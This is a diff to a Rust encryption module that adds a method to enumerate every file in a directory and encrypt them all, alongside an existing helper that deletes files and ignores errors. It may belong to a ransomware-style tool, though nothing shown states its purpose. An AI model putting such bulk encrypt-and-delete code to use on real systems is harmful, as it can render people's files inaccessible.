@@ -265,6 +265,29 @@ impl Encryptor128bit {
         }
     }
 
+    pub fn attempt_encrypt_files_in_dir(&self, dir: &String) {
+        match fs::read_dir(&dir) {
+            Ok(dir_read) => {
+                let mut files = vec![];
+                for entry in dir_read.filter_map(|file| file.ok()) {
+                    let path = &entry.path();
+
+                    if path.is_file() {
+                        let path_str = match path.to_str() {
+                            Some(path_str) => path_str,
+                            None => continue,
+                        };
+
+                        let path_string = path_str.to_owned();
+                        files.push(path_string);
+                    }
+                }
+                self.encrypt_files(&files);
+            }
+            Err(_) => (),
+        }
+    }
+
     fn attempt_delete_file(&self, path: &String) {
         match fs::remove_file(path) {
             Ok(_) => (),
